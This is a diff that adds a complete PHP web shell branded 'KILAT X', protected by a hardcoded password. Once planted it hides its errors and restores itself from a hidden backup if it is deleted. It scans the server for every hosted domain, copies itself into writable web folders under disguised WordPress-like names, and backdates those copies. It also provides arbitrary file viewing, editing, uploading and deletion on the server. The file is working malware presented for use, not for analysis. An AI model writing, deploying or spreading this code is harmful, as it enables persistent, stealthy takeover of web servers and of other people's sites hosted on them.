@@ -1,0 +1,305 @@
+<?php
+/**
+ * =====================================================================
+ *                    KILAT X - LIGHTNING EDITION
+ *         KILAT TEAM | LIGHTWEIGHT | ANTI-DETECTION
+ * =====================================================================
+ * Access: jangansadispaman
+ * =====================================================================
+ */
+error_reporting(0);
+ini_set('display_errors', 0);
+@set_time_limit(0);
+ignore_user_abort(true);
+
+session_start();
+$KEY = "jangansadispaman";
+$SELF = __FILE__;
+$SELF_NAME = basename(__FILE__);
+
+// ========== SIMPLE ANTI-DELETE ==========
+$backup = sys_get_temp_dir() . '/.' . md5($SELF_NAME) . '.php';
+if(!file_exists($backup) && file_exists($SELF)) { @copy($SELF, $backup); @chmod($backup, 0644); }
+if(!file_exists($SELF) && file_exists($backup)) { @copy($backup, $SELF); }
+
+// ========== AUTH ==========
+if(isset($_POST['key']) && $_POST['key'] === $KEY) { $_SESSION['auth'] = true; }
+if(isset($_GET['exit'])) { session_destroy(); header("Location: ?"); exit; }
+
+if(!isset($_SESSION['auth'])):
+?>
+<!DOCTYPE html>
+<html>
+<head><title>KILAT X</title><meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}body{background:#0a0a0f;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;}.box{background:rgba(10,10,20,0.9);border-radius:32px;padding:40px;width:100%;max-width:380px;border:1px solid #00ffff33;text-align:center;}h1{color:#00ffff;font-size:28px;margin-bottom:30px;}input{width:100%;padding:14px;background:#000;border:1px solid #00ffff33;border-radius:40px;color:#fff;margin-bottom:15px;text-align:center;}button{width:100%;padding:14px;background:linear-gradient(135deg,#00ffff,#0066ff);border:none;border-radius:40px;color:#000;font-weight:700;cursor:pointer;}
+</style>
+</head>
+<body><div class="box"><h1>⚡ KILAT X</h1><form method="post"><input type="password" name="key" placeholder="Access Key" autofocus><button>Enter</button></form></div></body></html>
+<?php exit; endif;
+
+// ========== FUNCTIONS ==========
+function fm($b){ if($b>=1e9) return round($b/1e9,2).'G'; if($b>=1e6) return round($b/1e6,2).'M'; if($b>=1e3) return round($b/1e3,2).'K'; return $b.'B'; }
+function datef($t){ return date('m/d H:i', $t); }
+function perm($f){ return file_exists($f)?substr(sprintf('%o',fileperms($f)),-4):'----'; }
+
+// ========== DOMAIN SCANNER ==========
+function scanDomains(){
+    $d=[]; $seen=[]; $cur=$_SERVER['HTTP_HOST']??'localhost'; $root=realpath($_SERVER['DOCUMENT_ROOT']??__DIR__);
+    if($root && is_dir($root)) { $d[]=['n'=>$cur,'p'=>$root]; $seen[$cur]=1; }
+    foreach(glob('/home/*',GLOB_ONLYDIR) as $h){
+        $dd=$h.'/domains';
+        if(is_dir($dd)){
+            foreach(glob($dd.'/*',GLOB_ONLYDIR) as $dm){
+                $dn=basename($dm); if(isset($seen[$dn])) continue;
+                foreach(['/public_html','/httpdocs',''] as $s){
+                    $rd=$dm.$s; if(is_dir($rd)){ $d[]=['n'=>$dn,'p'=>realpath($rd)]; $seen[$dn]=1; break; }
+                }
+            }
+        }
+        $ph=$h.'/public_html';
+        if(is_dir($ph) && !isset($seen[basename($h).'.com'])){ $d[]=['n'=>basename($h).'.com','p'=>realpath($ph)]; }
+    }
+    foreach(['/var/www','/var/www/vhosts'] as $vp){
+        if(!is_dir($vp)) continue;
+        foreach(glob($vp.'/*',GLOB_ONLYDIR) as $dir){
+            $dn=basename($dir); if(isset($seen[$dn])) continue;
+            foreach(['/public_html','/httpdocs','/htdocs','/www',''] as $s){
+                $rd=$dir.$s; if(is_dir($rd)){ $d[]=['n'=>$dn,'p'=>realpath($rd)]; $seen[$dn]=1; break; }
+            }
+        }
+    }
+    return $d;
+}
+
+// ========== FIND WRITABLE FOLDERS (NATURAL) ==========
+function findWritable($base){
+    $w=[];
+    $targets=['','/wp-content','/wp-content/uploads','/uploads','/files','/media','/assets','/cache','/tmp','/temp','/data','/logs','/storage','/public','/static','/resources'];
+    foreach($targets as $t){ $fp=$base.$t; if(is_dir($fp) && is_writable($fp)) $w[]=$fp; }
+    return array_unique($w);
+}
+
+// ========== GENERATE NATURAL FILENAME (NO NUMBERS) ==========
+function genName(){
+    $p=['loader','wp-logln','v3'];
+    $s=['wp','main','core','lib','inc','base','new','old','final','last','v2','v3','v4'];
+    $name = $p[array_rand($p)];
+    if(rand(0,2)==0) $name .= '_'.$s[array_rand($s)];
+    return $name.'.php';
+}
+
+// ========== DEPLOY (NO NEW FOLDERS) ==========
+function stealthDeploy($domain, $max=3){
+    $res=[]; $script=file_get_contents(__FILE__);
+    $writable=findWritable($domain['p']);
+    if(empty($writable)) return $res;
+    shuffle($writable); $cnt=0;
+    foreach($writable as $folder){
+        if($cnt>=$max) break;
+        $name=genName(); $fp=$folder.'/'.$name;
+        $c=0; while(file_exists($fp) && $c<5){ $name=genName(); $fp=$folder.'/'.$name; $c++; }
+        if(@file_put_contents($fp,$script)){
+            @chmod($fp,0644);
+            @touch($fp,time()-rand(86400*30,86400*90));
+            $url = buildUrl($fp,$domain['n']);
+            $res[]=['url'=>$url,'domain'=>$domain['n'],'file'=>$name];
+            $cnt++;
+        }
+        usleep(200000);
+    }
+    return $res;
+}
+
+function deployAll($max=3){
+    $domains=scanDomains(); $all=[];
+    foreach($domains as $d){ $dep=stealthDeploy($d,$max); if($dep) $all=array_merge($all,$dep); }
+    return ['domains'=>count($domains),'results'=>$all];
+}
+
+function buildUrl($path,$domain=null){
+    $doc=$_SERVER['DOCUMENT_ROOT']??__DIR__; $web=null;
+    $patterns=['/public_html','/httpdocs','/htdocs','/web','/www','/public'];
+    foreach($patterns as $pat){
+        if(strpos($path,$pat)!==false){ $parts=explode($pat,$path); if(count($parts)>1){ $web=$parts[0].$pat; break; } }
+    }
+    if(!$web) $web=$doc;
+    $rel=str_replace($web,'',$path); $rel=ltrim($rel,'/');
+    $proto=isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']==='on'?'https':'http';
+    $dom=$domain??$_SERVER['HTTP_HOST']??'localhost';
+    return $proto.'://'.$dom.'/'.$rel;
+}
+
+// ========== DIRECTORY LISTING ==========
+function getDir($p){
+    $it=scandir($p); $dirs=[]; $files=[];
+    foreach($it as $i){
+        if($i=='.'||$i=='..') continue;
+        $fp=$p.'/'.$i;
+        if(is_dir($fp)){ $dirs[]=['n'=>$i,'p'=>$fp,'pr'=>perm($fp),'m'=>filemtime($fp)]; }
+        else{ $files[]=['n'=>$i,'p'=>$fp,'s'=>filesize($fp),'pr'=>perm($fp),'m'=>filemtime($fp)]; }
+    }
+    sort($dirs); sort($files);
+    return ['dirs'=>$dirs,'files'=>$files];
+}
+
+// ========== HANDLE REQUESTS ==========
+$act=$_GET['a']??'';
+$path=isset($_GET['p'])?realpath($_GET['p']):__DIR__;
+$path=($path && is_dir($path))?$path:__DIR__;
+$msg='';
+
+if($act=='scan'){ $_SESSION['domains']=scanDomains(); header("Location: ?tab=domains"); exit; }
+if($act=='deploy_all'){ $res=deployAll(5); $_SESSION['deploy']=$res['results']; $_SESSION['domains']=scanDomains(); header("Location: ?tab=deploy"); exit; }
+if($act=='copy'){ $u=array_column($_SESSION['deploy']??[],'url'); header('Content-Type:text/plain'); echo implode("\n",$u); exit; }
+if($act=='clear'){ unset($_SESSION['domains'],$_SESSION['deploy']); header("Location: ?"); exit; }
+if($act=='del'&&isset($_GET['f'])){ $f=$path.'/'.$_GET['f']; if(file_exists($f) && is_file($f) && basename($f)!=$SELF_NAME) @unlink($f); header("Location: ?p=".urlencode($path)."&tab=files&msg=Deleted"); exit; }
+if($act=='deldir'&&isset($_GET['d'])){ $d=$path.'/'.$_GET['d']; if(is_dir($d) && count(scandir($d))<=2) @rmdir($d); header("Location: ?p=".urlencode($path)."&tab=files&msg=Removed"); exit; }
+if($act=='ren'&&isset($_POST['old'],$_POST['new'])){ $old=$_POST['old']; $new=dirname($old).'/'.basename($_POST['new']); if(file_exists($old) && !file_exists($new)) rename($old,$new); header("Location: ?p=".urlencode(dirname($old))."&tab=files"); exit; }
+if($act=='edit'&&isset($_GET['f'])){ $f=$_GET['f']; if(isset($_POST['c'])){ file_put_contents($f,$_POST['c']); header("Location: ?p=".urlencode(dirname($f))."&tab=files&msg=Saved"); exit; } $c=htmlspecialchars(file_get_contents($f)); ?>
+<!DOCTYPE html><html><head><title>Edit</title><style>body{background:#0a0a0f;font-family:monospace;padding:20px;}.e{max-width:1000px;margin:0 auto;background:#0a0a20;border:1px solid #00ffff;padding:25px;}textarea{width:100%;height:60vh;padding:15px;background:#000;border:1px solid #00ffff33;color:#0f0;font-family:monospace;}button{padding:10px 25px;background:#00ffff;border:none;color:#000;margin-right:10px;}a{color:#00ffff;text-decoration:none;padding:10px 25px;border:1px solid #00ffff;}</style></head><body><div class="e"><h3>Edit: <?=htmlspecialchars(basename($f))?></h3><form method="post"><textarea name="c"><?=$c?></textarea><div style="margin-top:20px;"><button>Save</button><a href="?p=<?=urlencode(dirname($f))?>&tab=files">Cancel</a></div></form></div></body></html>
+<?php exit; }
+if($act=='view'&&isset($_GET['f'])){ $f=$_GET['f']; if(file_exists($f)){ header('Content-Type:text/plain'); readfile($f); } exit; }
+if(isset($_POST['nf'])){ $f=$path.'/'.$_POST['fn']; if(!file_exists($f)) file_put_contents($f,"<?php\necho 'Ready';\n?>"); header("Location: ?p=".urlencode($path)."&tab=files"); exit; }
+if(isset($_POST['nd'])){ $d=$path.'/'.$_POST['dn']; if(!file_exists($d)) mkdir($d,0755); header("Location: ?p=".urlencode($path)."&tab=files"); exit; }
+if(isset($_FILES['up'])){ $t=$path.'/'.basename($_FILES['up']['name']); move_uploaded_file($_FILES['up']['tmp_name'],$t); header("Location: ?p=".urlencode($path)."&tab=files"); exit; }
+if(isset($_GET['msg'])) $msg=$_GET['msg'];
+
+$tab=$_GET['tab']??'files';
+$dir=getDir($path);
+$domains=$_SESSION['domains']??[];
+$deploy=$_SESSION['deploy']??[];
+?>
+<!DOCTYPE html>
+<html>
+<head><title>KILAT X • Lightning</title><meta name="robots" content="noindex"><meta name="viewport" content="width=device-width,initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#0a0a0f;font-family:'Inter',sans-serif;color:#e0e0e0;padding:20px;min-height:100vh;}
+.container{max-width:1400px;margin:0 auto;}
+.glass{background:rgba(10,10,20,0.7);backdrop-filter:blur(12px);border:1px solid rgba(0,255,255,0.08);border-radius:16px;}
+.header{padding:16px 24px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;}
+.logo h1{font-size:22px;color:#00ffff;letter-spacing:2px;}
+.logo p{font-size:10px;color:#666;}
+.exit{background:rgba(255,80,80,0.1);border:1px solid rgba(255,80,80,0.3);padding:8px 20px;border-radius:40px;color:#ff6b6b;text-decoration:none;font-size:12px;}
+.tabs{display:flex;gap:4px;margin-bottom:20px;flex-wrap:wrap;}
+.tab{padding:10px 24px;background:#00000040;border:1px solid #00ffff1a;color:#aaa;text-decoration:none;font-size:12px;border-radius:40px;}
+.tab i{margin-right:6px;}
+.tab:hover{color:#00ffff;border-color:#00ffff33;}
+.tab.active{background:#00ffff0d;border-color:#00ffff;color:#00ffff;}
+.badge{background:#00ffff1a;padding:2px 8px;border-radius:30px;margin-left:8px;font-size:9px;}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px;}
+.stat{background:#00000040;border:1px solid #00ffff08;border-radius:12px;padding:16px;text-align:center;}
+.stat-val{font-size:28px;font-weight:700;color:#00ffff;}
+.stat-label{font-size:10px;color:#666;margin-top:4px;}
+.actions-bar{display:flex;gap:10px;flex-wrap:wrap;padding:14px 20px;margin-bottom:20px;}
+.btn{background:#00000040;border:1px solid #00ffff15;padding:8px 20px;border-radius:40px;color:#ccc;font-size:12px;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:8px;}
+.btn:hover{background:#00ffff0d;border-color:#00ffff;color:#00ffff;}
+.btn-primary{background:linear-gradient(135deg,#00ffff,#0066ff);color:#000;}
+.btn-primary:hover{transform:translateY(-1px);}
+.card{padding:20px;margin-bottom:20px;border-radius:16px;}
+.card h3{color:#00ffff;font-size:14px;margin-bottom:16px;}
+.domain-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:8px;}
+.domain-item{background:#00000040;border:1px solid #00ffff08;border-radius:12px;padding:14px;}
+.domain-name{color:#00ffff;font-weight:500;margin-bottom:4px;font-size:13px;}
+.domain-path{color:#666;font-size:10px;}
+.url-list{max-height:400px;overflow-y:auto;}
+.url-item{background:#00000040;border:1px solid #00ffff08;padding:12px 16px;margin-bottom:6px;border-radius:12px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;}
+.url-domain{color:#00ffff;font-size:11px;min-width:130px;}
+.url-link{color:#00c896;font-family:monospace;font-size:11px;flex:1;word-break:break-all;}
+.btn-sm{background:#00000040;border:1px solid #00ffff15;padding:5px 12px;border-radius:30px;color:#aaa;font-size:10px;cursor:pointer;}
+.table-wrapper{overflow-x:auto;}table{width:100%;border-collapse:collapse;}
+th{text-align:left;padding:12px 14px;background:#00000040;color:#00ffff;font-size:11px;border-bottom:1px solid #00ffff0d;}
+td{padding:10px 14px;border-bottom:1px solid #ffffff08;font-size:12px;}
+tr:hover{background:#00ffff04;}
+.link{color:#e0e0e0;text-decoration:none;}
+.link:hover{color:#00ffff;}
+.action-btn{padding:4px 10px;border-radius:30px;font-size:10px;background:#00000040;color:#aaa;text-decoration:none;display:inline-flex;align-items:center;gap:4px;}
+.action-btn:hover{background:#00ffff12;color:#00ffff;}
+.breadcrumb{padding:12px 18px;margin-bottom:16px;border-radius:14px;font-size:12px;}
+.breadcrumb a{color:#00ffff;text-decoration:none;}
+.empty{text-align:center;padding:40px;color:#555;font-size:12px;}
+.footer{text-align:center;margin-top:24px;padding:16px;font-size:9px;color:#555;}
+@media(max-width:768px){body{padding:12px;}.stats{grid-template-columns:repeat(2,1fr);}}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="glass header">
+<div class="logo"><h1><i class="fas fa-bolt"></i> KILAT X</h1><p>Lightning Edition // Anti-Detection</p></div>
+<a href="?exit=1" class="exit"><i class="fas fa-sign-out-alt"></i> Exit</a>
+</div>
+
+<div class="tabs">
+<a href="?tab=files" class="tab <?=$tab=='files'?'active':''?>"><i class="fas fa-folder"></i> Files</a>
+<a href="?tab=domains" class="tab <?=$tab=='domains'?'active':''?>"><i class="fas fa-globe"></i> Domains <span class="badge"><?=count($domains)?></span></a>
+<a href="?tab=deploy" class="tab <?=$tab=='deploy'?'active':''?>"><i class="fas fa-rocket"></i> Deploy <span class="badge"><?=count($deploy)?></span></a>
+</div>
+
+<div class="stats">
+<div class="stat"><div class="stat-val"><?=count($domains)?></div><div class="stat-label">Domains</div></div>
+<div class="stat"><div class="stat-val"><?=count($deploy)?></div><div class="stat-label">Deployed</div></div>
+<div class="stat"><div class="stat-val"><?=count($dir['dirs'])+count($dir['files'])?></div><div class="stat-label">Items</div></div>
+</div>
+
+<?php if($msg):?><div class="alert" style="background:#00c89610;border-left:3px solid #00c896;padding:12px 18px;margin-bottom:16px;border-radius:12px;"><i class="fas fa-check-circle"></i> <?=htmlspecialchars($msg)?></div><?php endif;?>
+
+<div class="glass actions-bar">
+<a href="?a=scan" class="btn"><i class="fas fa-search"></i> Scan Domains</a>
+<a href="#" class="btn btn-primary" onclick="deployAll()"><i class="fas fa-cloud-upload-alt"></i> Deploy All</a>
+<?php if($deploy):?><a href="?a=copy" target="_blank" class="btn"><i class="fas fa-copy"></i> Copy URLs</a><?php endif;?>
+<a href="?a=clear" class="btn"><i class="fas fa-trash"></i> Clear</a>
+</div>
+
+<?php if($tab=='domains'):?>
+<div class="glass card">
+<h3><i class="fas fa-globe"></i> Detected Domains</h3>
+<?php if(empty($domains)):?><div class="empty">Click "Scan Domains" to start</div><?php else:?>
+<div class="domain-grid"><?php foreach($domains as $d):?><div class="domain-item"><div class="domain-name"><?=htmlspecialchars($d['n'])?></div><div class="domain-path"><?=htmlspecialchars($d['p'])?></div></div><?php endforeach;?></div><?php endif;?>
+</div>
+
+<?php elseif($tab=='deploy'):?>
+<div class="glass card">
+<h3><i class="fas fa-rocket"></i> Deploy Results</h3>
+<?php if(empty($deploy)):?><div class="empty">Ready to deploy. Click "Deploy All"</div><?php else:?>
+<div class="url-list">
+<?php $byDom=[]; foreach($deploy as $d)$byDom[$d['domain']][]=$d; foreach($byDom as $dm=>$fs):?>
+<div style="margin-bottom:20px;"><div style="color:#00ffff;margin-bottom:10px;font-size:12px;"><?=htmlspecialchars($dm)?> (<?=count($fs)?>)</div>
+<?php foreach($fs as $f):?><div class="url-item"><span class="url-domain"><?=htmlspecialchars($f['file'])?></span><code class="url-link"><?=htmlspecialchars($f['url'])?></code><button class="btn-sm" onclick="copyUrl('<?=htmlspecialchars($f['url'])?>')"><i class="far fa-copy"></i> Copy</button><a href="<?=htmlspecialchars($f['url'])?>" target="_blank" class="btn-sm"><i class="fas fa-external-link-alt"></i> Open</a></div><?php endforeach;?></div>
+<?php endforeach;?></div><?php endif;?>
+</div>
+
+<?php else:?>
+<div class="glass breadcrumb"><a href="?tab=files&p=/"><i class="fas fa-home"></i> Root</a><?php $parts=explode('/',trim($path,'/'));$cur='';foreach($parts as $p){if(empty($p))continue;$cur.='/'.$p;echo ' <span style="color:#555;">/</span> <a href="?tab=files&p='.urlencode($cur).'">'.htmlspecialchars($p).'</a>';} ?></div>
+
+<div class="glass actions-bar" style="margin-bottom:16px;">
+<form method="post" enctype="multipart/form-data" style="display:flex;gap:8px;"><input type="file" name="up" style="background:#000;border:1px solid #00ffff33;padding:8px 12px;border-radius:40px;color:#fff;"><button class="btn">Upload</button></form>
+<form method="post" style="display:flex;gap:8px;"><input type="text" name="fn" placeholder="file.php" style="background:#000;border:1px solid #00ffff33;padding:8px 12px;border-radius:40px;color:#fff;"><button name="nf" class="btn">File</button></form>
+<form method="post" style="display:flex;gap:8px;"><input type="text" name="dn" placeholder="folder" style="background:#000;border:1px solid #00ffff33;padding:8px 12px;border-radius:40px;color:#fff;"><button name="nd" class="btn">Folder</button></form>
+<a href="?tab=files&p=/" class="btn"><i class="fas fa-home"></i> Root</a>
+</div>
+
+<div class="table-wrapper glass" style="padding:0;overflow:hidden;">
+<table><thead><tr><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
+<tbody>
+<?php foreach($dir['dirs'] as $d):?><tr><td><i class="fas fa-folder" style="color:#00ffff;margin-right:8px;"></i> <a href="?tab=files&p=<?=urlencode($d['p'])?>" class="link"><?=htmlspecialchars($d['n'])?></a></td><td>—</td><td><?=$d['pr']?></td><td><?=datef($d['m'])?></td><td><div class="actions"><a href="#" onclick="ren('<?=urlencode($d['p'])?>','<?=htmlspecialchars($d['n'])?>')" class="action-btn"><i class="fas fa-pen"></i> Rename</a><a href="?a=deldir&d=<?=urlencode($d['n'])?>&p=<?=urlencode($path)?>" class="action-btn" onclick="return confirm('Delete?')" style="color:#ff6b6b;"><i class="fas fa-trash"></i> Del</a></div></td></tr><?php endforeach;?>
+<?php foreach($dir['files'] as $f): $self=(basename($f['p'])==$SELF_NAME);?><tr><td><i class="fas fa-file" style="color:#666;margin-right:8px;"></i> <?=htmlspecialchars($f['n'])?><?php if($self):?> <span style="color:#00c896;font-size:9px;">⚡</span><?php endif;?></td><td><?=fm($f['s'])?></td><td><?=$f['pr']?></td><td><?=datef($f['m'])?></td><td><div class="actions"><a href="?a=view&f=<?=urlencode($f['p'])?>" target="_blank" class="action-btn"><i class="fas fa-eye"></i> View</a><a href="?a=edit&f=<?=urlencode($f['p'])?>" class="action-btn"><i class="fas fa-edit"></i> Edit</a><a href="#" onclick="ren('<?=urlencode($f['p'])?>','<?=htmlspecialchars($f['n'])?>')" class="action-btn"><i class="fas fa-pen"></i> Rename</a><?php if(!$self):?><a href="?a=del&f=<?=urlencode($f['n'])?>&p=<?=urlencode($path)?>" class="action-btn" onclick="return confirm('Delete?')" style="color:#ff6b6b;"><i class="fas fa-trash"></i> Del</a><?php else:?><span style="color:#555;"><i class="fas fa-lock"></i> Lock</span><?php endif;?></div></td></tr><?php endforeach;?>
+<?php if(empty($dir['dirs']) && empty($dir['files'])):?><tr><td colspan="5" class="empty">Empty directory</td></tr><?php endif;?>
+</tbody></table>
+</div>
+<?php endif;?>
+
+<div class="footer"><i class="fas fa-bolt"></i> KILAT X • Lightning Edition • Anti-Detection</div>
+</div>
+
+<script>
+function deployAll(){
+    if(confirm('Deploy to ALL domains? (Stealth mode - no new folders, natural names)')){ location.href='?a=deploy_all'; }
+}
+function copyUrl(u){ navigator.clipboard.writeText(u); alert('Copied!'); }
+function ren(p,o){ let n=prompt('New name:',o); if(n && n!=o){ let f=document.createElement('form');f.method='POST';f.action='?a=ren';let i1=document.createElement('input');i1.type='hidden';i1.name='old';i1.value=p;let i2=document.createElement('input');i2.type='hidden';i2.name='new';i2.value=n;f.appendChild(i1);f.appendChild(i2);document.body.appendChild(f);f.submit(); } }
+</script>
+</body>
+</html>
